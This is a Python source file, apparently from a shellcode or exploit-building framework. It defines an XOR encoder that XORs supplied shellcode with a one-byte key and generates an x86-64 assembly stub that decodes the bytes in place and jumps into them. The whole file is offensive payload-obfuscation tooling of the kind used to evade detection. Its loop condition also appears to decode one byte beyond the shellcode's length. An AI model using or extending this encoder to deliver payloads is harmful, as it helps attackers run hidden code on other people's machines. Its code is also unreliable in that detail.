from .ArchEncoder import ArchEncoder

from ...lib import string_to_bytes, bytes_to_string

class Encoder(ArchEncoder):
    @staticmethod
    def param_template():
        return {'xor_key': '15', 'shellcode': None}

    def __init__(self, params={}):
        data = (
            'key:\n'
            '    .byte {xor_key}\n'
            'shellcode:\n'
            '    .byte {shellcode}\n'
        )
        code = (
            'xor_encoder:\n'
            '    movb key(%rip), %bl\n'
            '    xorl %eax, %eax\n'
            'loop:\n'
            '    leaq shellcode(%rip), %rcx\n'
            '    addq %rax, %rcx\n'
            '    xorb %bl, (%rcx)\n'
            '    inc %ax\n'
            '    cmpw ${shellcode_length}, %ax\n'
            '    jle loop\n'
            '    jmp shellcode\n'
        )

        super().__init__(name='xor encoder', code=code, data=data, params=params)

    def prepare_build(self):
        key = int(self.params['xor_key'])
        xored = []
        shellcode = self.params['shellcode']

        if isinstance(shellcode, str):
            shellcode = string_to_bytes(shellcode)

        for byte in shellcode:
            xored.append(byte ^ key)

        self.params['shellcode_length'] = len(xored)
        self.params['shellcode'] = bytes_to_string(xored, sep=', ', prefix='0x')
